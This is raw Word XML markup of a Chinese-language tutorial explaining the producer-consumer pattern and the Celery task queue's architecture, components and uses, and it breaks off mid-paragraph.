    <w:p w14:paraId="07C0FE9D"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生产者生成消息，缓存到消息队列中，消费者读取消息队列中的消息并执行。</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生产者消费者模式面向过程的一种编程模式。在实际的软件开发过程中，经常会碰到如下场景：某个模块负责产生数据，这些数据由另一个模块来负责处理（此处的模块是广义的，可以是类、函数、线程、进程等）。产生数据的模块，就形象地称为生产者；而处理数据的模块，就称为消费者。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11F48084"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三、</w:t>
      </w:r>
      <w:r w:rsidRPr="0022246E">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>celery</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BF2F342"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是基于</w:t>
      </w:r>
      <w:r w:rsidRPr="007C2612">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>python</w:t>
      </w:r>
      <w:r w:rsidRPr="007C2612">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>实现的一个异步任务的调度工具，同时还是一个任务队列，主要用于处理耗时的任务。</w:t>
      </w:r>
      <w:r w:rsidRPr="007C2612">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> celery</w:t>
      </w:r>
      <w:r w:rsidRPr="007C2612">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>本身不含消息服务，需要依赖一个消息队列</w:t>
      </w:r>
      <w:r w:rsidRPr="007C2612">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>MQ</w:t>
      </w:r>
      <w:r w:rsidRPr="007C2612">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>来来传递任务，客户端代码只需要向</w:t>
      </w:r>
      <w:r w:rsidRPr="007C2612">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>MQ</w:t>
      </w:r>
      <w:r w:rsidRPr="007C2612">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>中派发任务，</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进程就可以从</w:t>
      </w:r>
      <w:r w:rsidRPr="007C2612">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>MQ</w:t>
      </w:r>
      <w:r w:rsidRPr="007C2612">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>中读取消息并派发给</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，从而达到了客户端程序与</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进程解耦的效果。而且</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进程并不需要监听任何端口，减少了配置的复杂性。目前，</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支持的消息服务有</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甚至是数据库，当然</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应该是最佳选择。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="626B2ABA" w14:textId="77777777" w:rsidR="00330CED" w:rsidRPr="007C2612"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w:t>
      </w:r>
      <w:r w:rsidRPr="007C2612">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r w:rsidRPr="007C2612">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>）</w:t>
      </w:r>
      <w:r w:rsidRPr="007C2612">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>celery</w:t>
      </w:r>
      <w:r w:rsidRPr="007C2612">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>架构</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4453163C"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架构由三个模块组成：消息中间件（</w:t>
      </w:r>
      <w:r w:rsidRPr="007C2612">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>message broker</w:t>
      </w:r>
      <w:r w:rsidRPr="007C2612">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>），任务执行单元（</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）和任务执行结果存储（</w:t>
      </w:r>
      <w:r w:rsidRPr="007C2612">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>task result store</w:t>
      </w:r>
      <w:r w:rsidRPr="007C2612">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>）组成。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4288CE85"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消息中间件（</w:t>
      </w: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消息中间人，是任务调度队列，是一个独立的服务，是一个生产者消费者模式，生产者把任务放入队列中，消费者（</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）从任务队列中取出任务执行，任务的执行可以按照顺序依次执行也可以按照计划时间进行。但是</w:t>
      </w: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本身不提供队列服务，所以要集成第三方队列，推荐使用</w:t>
      </w:r>
      <w:r w:rsidRPr="007C2612">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>RatbbitMQ</w:t>
      </w:r>
      <w:r w:rsidRPr="007C2612">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>或</w:t>
      </w:r>
      <w:r w:rsidRPr="007C2612">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Redis.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15678C2D"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任务执行单元（</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）：即执行任务的程序，可以有多个并发。它实时监控消息队列，获取队列中调度的任务，并执行它。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4079553E"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任务执行结果存储（</w:t>
      </w:r>
      <w:r w:rsidRPr="007C2612">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>task result store</w:t>
      </w:r>
      <w:r w:rsidRPr="007C2612">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>）：由于任务的执行同主程序分开，如果主程序想获取任务执行的结果，就必须通过中间件存储。同消息中间人一样，存储也可以使用</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；另外，假如不需要保存执行的结果也可以不配置这个模块。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09C7FC86"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2</w:t>
      </w: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celery</w:t>
      </w:r>
      <w:r w:rsidRPr="0022246E">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>特点</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="582F61B7"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lastRenderedPageBreak/>
        <w:t>简单：</w:t>
      </w:r>
      <w:r w:rsidRPr="007C2612">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Celery </w:t>
      </w:r>
      <w:r w:rsidRPr="007C2612">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>易于使用和维护，并且它不需要配置文件</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高可用性：倘若连接丢失或失败，进程和客户端会自动重试，并且通过主</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主或主</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从方式复制来提高可用性</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快速：单个</w:t>
      </w:r>
      <w:r w:rsidRPr="007C2612">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> Celery </w:t>
      </w:r>
      <w:r w:rsidRPr="007C2612">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>进程每分钟可处理数以百万计的任务，而保持往返延迟在亚毫秒级</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灵活：</w:t>
      </w:r>
      <w:r w:rsidRPr="007C2612">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Celery </w:t>
      </w:r>
      <w:r w:rsidRPr="007C2612">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>几乎所有部分都可以扩展或单独使用。可以自制连接池、序列化、压缩模式、日志、调度器、消费者、生产者、自动扩展、中间人传输或更多。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CC49CCC"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3</w:t>
      </w:r>
      <w:r w:rsidRPr="0022246E">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>）工作原理</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DC0067E"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它的基本工作就是管理分配任务到不同的服务器，并且取得结果。至于说服务器之间是如何进行通信的？这个</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本身不能解决。所</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作为一个消息队列管理工具被引入到和</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集成，负责处理服务器之间的通信任务。和</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的关系只是在于，</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没有消息存储功能，他需要介质，比如</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mysql</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mongodb </w:t>
      </w:r>
      <w:r w:rsidRPr="007C2612">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>都是可以的。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AC5D516"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4</w:t>
      </w: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celery</w:t>
      </w:r>
      <w:r w:rsidRPr="0022246E">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>应用</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="328C6125" w14:textId="77777777" w:rsidR="00330CED" w:rsidRPr="007C2612" w:rsidRDefault="00330CED" w:rsidP="00330CED">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们通常使用它来实现异步任务（</w:t>
      </w:r>
      <w:r w:rsidRPr="007C2612">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>async task</w:t>
      </w:r>
      <w:r w:rsidRPr="007C2612">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>）和定时任务（</w:t>
      </w:r>
      <w:r w:rsidRPr="007C2612">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>crontab</w:t>
      </w:r>
      <w:r w:rsidRPr="007C2612">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>）。它的架构组成如下图</w:t>
      </w:r>
      <w:r w:rsidRPr="007C2612">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E778C1A" w14:textId="77777777" w:rsidR="00330CED" w:rsidRPr="007C2612" w:rsidRDefault="00330CED" w:rsidP="00330CED">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drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="53D3E1F9" wp14:editId="0290E474">
            <wp:extent cx="4423082" cy="4114495"/>
            <wp:effectExtent l="0" t="0" r="0" b="635"/>
            <wp:docPr id="2" name="图片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24642" cy="4115947"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B469C1B"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1</w:t>
      </w:r>
      <w:r w:rsidRPr="007C2612">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>、任务（</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用户定义的函数，用于实现用户的功能，比如执行一个耗时很长的任务</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EDFAFC5"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lastRenderedPageBreak/>
        <w:t>2</w:t>
      </w:r>
      <w:r w:rsidRPr="007C2612">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>、中间介（</w:t>
      </w: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用于存放</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的地方，但是这个中间介需要解决一个问题，就是可能需要存放非常非常多的</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，而且要保证</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能够从这里拿取</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2666EAFD"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3</w:t>
      </w:r>
      <w:r w:rsidRPr="007C2612">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>、执行者（</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用于执行</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，也就是真正调用我们在</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中定义的函数</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5551BE41"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4</w:t>
      </w:r>
      <w:r w:rsidRPr="007C2612">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>、存储（</w:t>
      </w:r>
      <w:r w:rsidRPr="007C2612">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Backend</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把执行</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返回的结果进行存储，以供用户查看或调用</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BFCB55B" w14:textId="77777777" w:rsidR="00330CED" w:rsidRPr="00362811" w:rsidRDefault="00330CED" w:rsidP="00330CED">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:before="192" w:after="192" w:line="340" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00362811">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Celery</w:t>
      </w:r>
      <w:r w:rsidRPr="00362811">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>中，以上组件具体功能如下：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68C6338E"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任务模块</w:t>
      </w:r>
      <w:r w:rsidRPr="007C2612">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> Task</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16B4C414"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包含异步任务和定时任务。其中，异步任务通常在业务逻辑中被触发并发往任务队列，而定时任务由</w:t>
      </w:r>
      <w:r w:rsidRPr="007C2612">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> Celery Beat </w:t>
      </w:r>
      <w:r w:rsidRPr="007C2612">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>进程周期性地将任务发往任务队列。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FD2DF8D"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消息中间件</w:t>
      </w:r>
      <w:r w:rsidRPr="007C2612">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> Broker</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47D6E51C"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，即为任务调度队列，接收任务生产者发来的消息（即任务），将任务存入队列。</w:t>
      </w:r>
      <w:r w:rsidRPr="007C2612">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Celery </w:t>
      </w:r>
      <w:r w:rsidRPr="007C2612">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>本身不提供队列服务，官方推荐使用</w:t>
      </w:r>
      <w:r w:rsidRPr="007C2612">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> RabbitMQ </w:t>
      </w:r>
      <w:r w:rsidRPr="007C2612">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r w:rsidRPr="007C2612">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> Redis </w:t>
      </w:r>
      <w:r w:rsidRPr="007C2612">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>等。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A20488D"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任务执行单元</w:t>
      </w:r>
      <w:r w:rsidRPr="007C2612">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> Worker</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="638C19D8"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Worker </w:t>
      </w:r>
      <w:r w:rsidRPr="007C2612">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>是执行任务的处理单元，它实时监控消息队列，获取队列中调度的任务，并执行它。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10C85E65"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任务结果存储</w:t>
      </w:r>
      <w:r w:rsidRPr="007C2612">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> Backend</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71DA03E2"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Backend </w:t>
      </w:r>
      <w:r w:rsidRPr="007C2612">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>用于存储任务的执行结果，以供查询。同消息中间件一样，存储也可使用</w:t>
      </w:r>
      <w:r w:rsidRPr="007C2612">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> RabbitMQ, Redis </w:t>
      </w:r>
      <w:r w:rsidRPr="007C2612">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r w:rsidRPr="007C2612">
        <w:rPr>
